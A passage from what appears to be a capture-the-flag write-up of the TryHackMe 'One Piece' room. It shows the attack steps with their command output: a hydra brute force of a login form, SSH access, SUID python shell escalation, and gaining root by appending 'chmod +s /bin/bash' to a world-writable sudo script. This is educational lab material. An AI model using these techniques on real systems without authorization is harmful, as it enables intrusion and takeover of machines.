└─# hydra -l '{Redacted}' -P /usr/share/wordlists/rockyou.txt $RHOSTS http-post-form '/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR' -t 64
[...]
[80][http-post-form] host: 10.10.67.31   login: {Redacted}   password: {Redacted}
```

Found it!! Let's **login to the login page with the above credentials**!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a26.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a27.png)

Now, it says the location is **`unspecified`**...

```
Unfortunately, the location of this last Poneglyph is unspecified.
```

Hmm... **Is the location name called `unspecified`**, or the location is unspecified??

**Let me verify that real quick:** 
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# curl http://one-piece.thm/unspecified                                              
The last Road Poneglyphe: FUWS2LJNEAWS2LJN[...]
```

Oh you... Nice.

**Now, we have obtained all 4 Road Poneglyphe, let's combine them and decode it!**
```
FUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQ[...]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a28.png)

**This looks like a SSH credentials!**

## Task 2 - Laugh Tale

### Who is on Laugh Tale at the same time as Luffy?

Armed with above information, we now can login to SSH!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# ssh M0nk3y_D_7uffy@$RHOSTS    
M0nk3y_D_7uffy@10.10.67.31's password: 
[...]
M0nk3y_D_7uffy@Laugh-Tale:~$ whoami;hostname;id;ip a
M0nk3y_D_7uffy
Laugh-Tale
uid=1001(M0nk3y_D_7uffy) gid=1001(luffy) groups=1001(luffy)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:df:52:21:ea:17 brd ff:ff:ff:ff:ff:ff
    inet 10.10.67.31/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2357sec preferred_lft 2357sec
    inet6 fe80::df:52ff:fe21:ea17/64 scope link 
       valid_lft forever preferred_lft forever
```

We're user `M0nk3y_D_7uffy`!

**In the home directory of user `M0nk3y_D_7uffy` there is a text file called `laugh_tale.txt`**
```
M0nk3y_D_7uffy@Laugh-Tale:~$ ls -lah
total 56K
drwxr-xr-x  8 M0nk3y_D_7uffy luffy 4.0K Jul 29  2020 .
drwxr-xr-x  4 root           root  4.0K Jul 26  2020 ..
-rw-------  1 M0nk3y_D_7uffy luffy   14 Aug 14  2020 .bash_history
-rw-r--r--  1 M0nk3y_D_7uffy luffy  220 Jul 26  2020 .bash_logout
-rw-r--r--  1 M0nk3y_D_7uffy luffy 3.7K Jul 26  2020 .bashrc
drwx------ 11 M0nk3y_D_7uffy luffy 4.0K Jul 29  2020 .cache
drwx------ 11 M0nk3y_D_7uffy luffy 4.0K Jul 29  2020 .config
drwx------  3 M0nk3y_D_7uffy luffy 4.0K Jul 29  2020 .gnupg
-rw-------  1 M0nk3y_D_7uffy luffy  334 Jul 29  2020 .ICEauthority
-rw-r--r--  1 root           root   283 Jul 26  2020 laugh_tale.txt
drwx------  3 M0nk3y_D_7uffy luffy 4.0K Jul 29  2020 .local
drwx------  5 M0nk3y_D_7uffy luffy 4.0K Jul 29  2020 .mozilla
-rw-r--r--  1 M0nk3y_D_7uffy luffy  807 Jul 26  2020 .profile
drwx------  2 M0nk3y_D_7uffy luffy 4.0K Jul 29  2020 .ssh
```

```
M0nk3y_D_7uffy@Laugh-Tale:~$ cat laugh_tale.txt 
Finally, we reached Laugh Tale.
All is left to do is to find the One Piece.
Wait, there is another boat in here.
Be careful, it is the boat of Marshall D Teach, one of the 4 Emperors. He is the one that led your brother Ace to his death.
You want your revenge. Let's take him down !
```

### What allowed Luffy to win the fight?

**There is a weird binary that has SUID sticky bit:**
```
M0nk3y_D_7uffy@Laugh-Tale:~$ find / -perm -4000 2>/dev/null
[...]
/usr/bin/gomugomunooo_king_kobraaa

M0nk3y_D_7uffy@Laugh-Tale:~$ ls -lah /usr/bin/gomugomunooo_king_kobraaa 
-rwsr-xr-x 1 7uffy_vs_T3@ch teach 4.4M Jul 17  2020 /usr/bin/gomugomunooo_king_kobraaa
```

```
M0nk3y_D_7uffy@Laugh-Tale:~$ /usr/bin/gomugomunooo_king_kobraaa 
Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```

It's a **python shell** binary??

According to [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid), we can escalate to `7uffy_vs_T3@ch`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a29.png)

**Let's copy and paste that to the target machine:**
```
M0nk3y_D_7uffy@Laugh-Tale:~$ /usr/bin/gomugomunooo_king_kobraaa -c 'import os; os.execl("/bin/sh", "sh", "-p")'
$ whoami;hostname;id
7uffy_vs_T3@ch
Laugh-Tale
uid=1001(M0nk3y_D_7uffy) gid=1001(luffy) euid=1000(7uffy_vs_T3@ch) groups=1001(luffy)
```

I'm `7uffy_vs_T3@ch`!

```
$ cat /home/teach/luffy_vs_teach.txt
This fight will determine who can take the One Piece and who will be the next Pirate King.
These 2 monsters have a matchless will and none of them can let the other prevail.
Each of them have the same dream, be the Pirate King.
For one it means: Take over the World.
For the other: Be the freest man in the World.
Each of their hit creates an earthquake felt on the entire island.
But in the end, Luffy thanks to his willpower won the fight.
Now, he needs to find the One Piece.
```

### What is the One Piece?

**In the `teach` home directory, we can see that there is a `.password.txt` hidden file:**
```
$ ls -lah /home/teach
total 56K
drwxr-xr-x  7 7uffy_vs_T3@ch teach 4.0K Jul 26  2020 .
drwxr-xr-x  4 root           root  4.0K Jul 26  2020 ..
-rw-------  1 7uffy_vs_T3@ch teach    1 Aug 14  2020 .bash_history
-rw-r--r--  1 7uffy_vs_T3@ch teach  220 Jul 26  2020 .bash_logout
-rw-r--r--  1 7uffy_vs_T3@ch teach 3.7K Jul 26  2020 .bashrc
drwx------ 11 7uffy_vs_T3@ch teach 4.0K Jul 26  2020 .cache
drwx------ 11 7uffy_vs_T3@ch teach 4.0K Jul 26  2020 .config
drwx------  3 7uffy_vs_T3@ch teach 4.0K Jul 26  2020 .gnupg
-rw-------  1 7uffy_vs_T3@ch teach  334 Jul 26  2020 .ICEauthority
drwx------  3 7uffy_vs_T3@ch teach 4.0K Jul 26  2020 .local
-r--------  1 7uffy_vs_T3@ch teach  479 Jul 26  2020 luffy_vs_teach.txt
-r--------  1 7uffy_vs_T3@ch teach   37 Jul 26  2020 .password.txt
-rw-r--r--  1 7uffy_vs_T3@ch teach  807 Jul 26  2020 .profile
drwx------  2 7uffy_vs_T3@ch teach 4.0K Jul 26  2020 .ssh
-rw-r--r--  1 7uffy_vs_T3@ch teach    0 Jul 26  2020 .sudo_as_admin_successful
```

**password.txt:**
```
$ cat /home/teach/.password.txt
7uffy_vs_T3@ch:{Redacted}
```

**This looks like a SSH credentials! Let's SSH into that account!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/One-Piece]
└─# ssh 7uffy_vs_T3@ch@$RHOSTS                             
7uffy_vs_T3@ch@10.10.67.31's password: 
[...]
7uffy_vs_T3@ch@Laugh-Tale:~$ whoami;hostname;id;ip a
7uffy_vs_T3@ch
Laugh-Tale
uid=1000(7uffy_vs_T3@ch) gid=1000(teach) groups=1000(teach)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:df:52:21:ea:17 brd ff:ff:ff:ff:ff:ff
    inet 10.10.67.31/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3044sec preferred_lft 3044sec
    inet6 fe80::df:52ff:fe21:ea17/64 scope link 
       valid_lft forever preferred_lft forever
```

We're `7uffy_vs_T3@ch`!

**Sudo permission:**
```
7uffy_vs_T3@ch@Laugh-Tale:~$ sudo -l
[sudo] password for 7uffy_vs_T3@ch: 
Matching Defaults entries for 7uffy_vs_T3@ch on Laugh-Tale:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User 7uffy_vs_T3@ch may run the following commands on Laugh-Tale:
    (ALL) /usr/local/bin/less
```

**According to [GTFOBins](https://gtfobins.github.io/gtfobins/less/#sudo), we can escalate to root!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/One-Piece/images/a30.png)

```
7uffy_vs_T3@ch@Laugh-Tale:~$ sudo less /etc/profile
Sorry, I can't tell you where is the One Piece
```

**Hmm... Let's look at the binary and analyze it:**
```
7uffy_vs_T3@ch@Laugh-Tale:~$ ls -lah /usr/local/bin/less 
-rwxrwx-wx 1 root root 67 Aug 14  2020 /usr/local/bin/less
```

This `less` binary is owned by `root`, but **it's not world-readable, as it's missing the read bit.**

**However, it's world-writable, which is very, very weird!!**

**Armed with this information, we can just edit that binary, which adding a SUID sticky into `/bin/bash` via `echo`!**
```
7uffy_vs_T3@ch@Laugh-Tale:~$ echo "chmod +s /bin/bash" >> /usr/local/bin/less 

7uffy_vs_T3@ch@Laugh-Tale:~$ sudo /usr/local/bin/less
Sorry, I can't tell you where is the One Piece

7uffy_vs_T3@ch@Laugh-Tale:~$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
```

**It worked! Let's spawn a bash shell with SUID privilege!**
```
7uffy_vs_T3@ch@Laugh-Tale:~$ /bin/bash -p
bash-4.4# whoami;hostname;id
root
Laugh-Tale
uid=1000(7uffy_vs_T3@ch) gid=1000(teach) euid=0(root) egid=0(root) groups=0(root),1000(teach)
```

I'm root! :D

```
bash-4.4# ls -lah /root
total 36K
drwx------  5 root root 4.0K Jul 29  2020 .
drwxr-xr-x 24 root root 4.0K Jul 29  2020 ..
-rw-------  1 root root  217 Aug 14  2020 .bash_history
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  2 root root 4.0K Feb  3  2020 .cache
drwx------  3 root root 4.0K Jul 26  2020 .gnupg
drwxr-xr-x  3 root root 4.0K Jul 26  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root    0 Jul 26  2020 .python_history
-rw-r--r--  1 root root  172 Jul 29  2020 .wget-hsts
```

Nothing weird in `root` home directory.

**Alright, let's `grep` One Piece!**
```
bash-4.4# grep -ilR 'one piece' /opt /mnt /usr /home 2>/dev/null
[...]
/usr/share/mysterious/on3_p1ec3.txt
```

Found it!

```
bash-4.4# cat /usr/share/mysterious/on3_p1ec3.txt
One Piece: {Redacted}
```

# Conclusion

What we've learned:

1. FTP Enumeration
2. Encoding & Decoding
3. OSINT (Open-Source Intelligence)
4. Directory Enumeration
5. Hidden File Enumeration
6. Steganography
7. Command Injection
8. Cookie Poisoning
9. Command Injection (File Upload)
10. Cracking Steganography File Passphrase via `stegseek`
11. Bruteforcing HTTP POST Form
12. Privilege Escalation via Python Shell With SUID Sticky Bit
13. Privilege Escalation via Misconfigured Bash Script File With `sudo`